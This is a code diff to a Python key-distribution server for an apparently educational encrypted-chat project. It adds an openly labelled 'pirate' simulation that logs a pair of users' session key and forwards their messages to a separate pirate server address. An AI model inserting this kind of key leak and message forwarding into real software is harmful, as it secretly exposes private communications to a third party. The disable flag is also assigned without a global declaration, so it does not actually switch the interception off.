@@ -1,4 +1,3 @@
-import socket
 import Database
 import Cryptage
 from FiableSocket import FiableSocket
@@ -6,6 +5,9 @@ from FiableSocket import FiableSocket
 end = False
 nom_arbitre = 'C'
 
+pirate_addr = ()
+pirate_users = []
+pirate_fin = False
 
 def recv(socket: FiableSocket) -> None:
     """
@@ -279,6 +281,12 @@ def T4_execute(msg: str, user: str, addr: tuple[str, int], sck: FiableSocket):
 
         Database.set_destinataire(user, user_b)
         Database.set_destinataire(user_b, user)
+
+        # Mise en place du pirate
+        if len(pirate_users) == 0:
+            pirate_users.append(user)
+            pirate_users.append(user_b)
+            print("INFO : Le pirate a été mis en place entre " + user + " et " + user_b + ". La clé de session est " + ks + "(" + str(len(ks)) + ")")
     else:
         # Envoi du message Eclef_A<Nom de l’arbitre, Nom utilisateur A, T4>
         msg = nom_arbitre + ',' + user + ',T4'
@@ -301,6 +309,9 @@ def T5_execute(msg: str, user: str, addr: tuple[str, int]):
         if user == user_conn:
             Database.set_destinataire(user, None)
             print('Le destinataire de ' + user + ' a été supprimé !')
+            if user in pirate_users:
+                pirate_fin = True
+                print("INFO : Le pirate a été désactivé car " + user + " a quitté sa discussion")
 
 def envoi_message(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
     """
@@ -320,11 +331,26 @@ def envoi_message(msg: str, addr: tuple[str, int], sck: FiableSocket) -> bool:
             if Database.get_destinataire(nom_destinataire) == nom_util:
                 addr_dest = Database.get_addr(nom_destinataire)
                 if addr_dest is not None:
-                    print(addr_dest)
                     sck.sendto(msg, addr_dest)
+                    envoi_pirate(nom_util, nom_destinataire, msg, sck)
                     envoye = True
 
     return envoye
 
+def envoi_pirate(envoyeur: str, dest: str, msg: str, sck: FiableSocket) -> None:
+    """
+    Permet la simulation d'un piratage d'une communication entre 2 utilisateurs. Envoi les messages reçus de la
+    communication de ces 2 utilisateurs à un serveur pirate (Voir config dans Arbitre.py)
 
+    /!\ Cette partie n'utilise pas de fiabilisation des échanges de messages /!\
 
+    :param envoyeur: Le nom de l'utilisateur qui a envoyé le message
+    :param dest: Le nom de l'utilisateur qui a reçu le message
+    :param msg: Le message à envoyer au serveur pirate
+    :param sck: Le socket à utiliser pour l'envoi
+    :return: None
+    """
+
+    if not pirate_fin:
+        if dest in pirate_users and envoyeur in pirate_users:
+            sck.socket.sendto(msg, pirate_addr)
